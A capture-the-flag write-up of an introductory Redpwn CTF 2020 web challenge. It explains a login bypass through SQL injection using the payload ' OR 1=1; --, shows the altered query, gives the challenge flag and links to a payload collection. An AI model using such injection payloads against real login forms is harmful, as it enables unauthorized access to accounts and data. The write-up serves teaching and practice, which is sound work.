---
layout: writeup
category: Redpwn-CTF
chall_description: https://i.imgur.com/fLvnFA0.png
points: 148
solves: 1007
tags: n00b web sql-injection
date: 2020-07-25
comments: true
---

This challenge is just basic SQL Injection. 

The query used could be something like:
```sql
SELECT * 
FROM users
WHERE
    username = '{USER_NAME}' 
    AND
    password = '{PASSWORD}'
...
;
```

If we enter any username, say `admin` and password `' OR 1=1; --`, the query would become
```sql
SELECT * 
FROM users
WHERE
    username = 'admin' 
    AND
    password = '' OR 1=1; --'
...
;
```

Now, the query just returns all the rows in the table because of  `OR 1=1`. That leads to an alert message with the flag `flag{0bl1g4t0ry_5ql1}`.

Various other SQL injection attack payloads can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).